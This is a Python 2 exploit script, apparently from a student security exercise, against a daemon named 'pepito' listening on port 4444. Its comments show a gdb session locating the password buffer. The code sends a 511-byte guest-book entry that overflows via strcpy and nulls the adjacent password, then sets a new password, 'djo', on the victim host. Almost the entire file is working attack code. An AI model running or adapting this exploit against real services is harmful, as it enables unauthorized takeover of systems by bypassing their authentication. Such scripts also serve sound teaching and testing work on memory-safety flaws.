#!/usr/bin/env python2
# sploit le strcpy pour depasser sur le tableau password

# (gdb)$ set follow-fork-mode child
# (gdb)$ b *0x08048c88
# Breakpoint 1 at 0x8048c88: file main.c, line 75.
# (gdb)$ r start
# Starting program: /home/jonathan/all/ESL/pepito-2011/src/pepito_jo/pepito start
# [New process 3032]
# Daemon started
# Advertisement successfully changed
# [Switching to process 3032]
#
# Breakpoint 1, 0x08048c88 in handlerAddToGuestBook (packetPtr=0xbfffe9a8, packetSize=0) at main.c:75
# 75 }
# (gdb)$ x/s 0x804ac00
# 0x804ac00 <password>:	 "djo"
# (gdb)$

import socket
import os
import time
import sys

if len(sys.argv) != 2:
   print "[-] Syntax: ./sploit.py <ip_victime>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], 4444))
except:
   print "[-] Error connexion"
   sys.exit(1)

newpasswd = "\x00"
guestBook = "A" * 511
cmdID     = "1"
arg2      = str(len(guestBook) + len(newpasswd) + 1)
payload   = cmdID + " " + arg2 + " " + guestBook + newpasswd

print "[+] Try to reste null passwd"
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload1"
   sys.exit(1)

print "[+] passwd is (null)"

time.sleep(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], 4444))
except:
   print "[-] Error connexion"
   sys.exit(1)

newpasswd = "djo"
cmdID     = "0"
arg2      = str(len(newpasswd) + 1)
payload   = cmdID + " " + arg2 + " " + newpasswd

print "[+] Try to set a new password"
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload2"
   sys.exit(1)

print "[+] The new password is now \"djo\""
